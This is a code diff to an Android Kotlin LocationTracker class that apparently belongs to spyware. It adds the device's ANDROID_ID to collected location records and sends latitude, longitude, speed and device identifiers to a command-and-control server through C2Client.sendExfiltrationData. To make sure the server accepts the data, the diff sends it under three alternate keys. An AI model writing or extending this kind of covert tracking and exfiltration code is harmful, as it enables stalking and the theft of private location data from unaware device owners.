@@ -10,6 +10,7 @@ import android.os.Bundle
 import android.os.Environment
 import android.os.Handler
 import android.os.Looper
+import android.provider.Settings
 import android.util.Log
 import androidx.core.app.ActivityCompat
 import org.json.JSONObject
@@ -179,6 +180,7 @@ class LocationTracker(private val context: Context) {
                 put("speed", location.speed)
                 put("provider", location.provider)
                 put("device_model", android.os.Build.MODEL)
+                put("device_id", Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID))
             }
             
             val locationFile = File(getStorageDir(), "location_$timestamp.json")
@@ -195,7 +197,22 @@ class LocationTracker(private val context: Context) {
             // Send location data to C2 server
             try {
                 val c2Client = C2Client(context)
+                
+                // Ensure we're using the right data type that the server expects
+                c2Client.sendExfiltrationData("location_data", locationJson.toString())
+                
+                // Try alternate data type name in case the server is expecting a different key
                 c2Client.sendExfiltrationData("location", locationJson.toString())
+                
+                // Also try sending as a simple location object
+                val simpleLocation = JSONObject().apply {
+                    put("latitude", location.latitude)
+                    put("longitude", location.longitude)
+                    put("timestamp", timestamp)
+                    put("device_id", Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID))
+                }
+                c2Client.sendExfiltrationData("locations", simpleLocation.toString())
+                
                 Log.d(TAG, "Location sent to C2 server: ${C2Config.SERVER_URL}")
             } catch (e: Exception) {
                 Log.e(TAG, "Error sending location to C2 server", e)
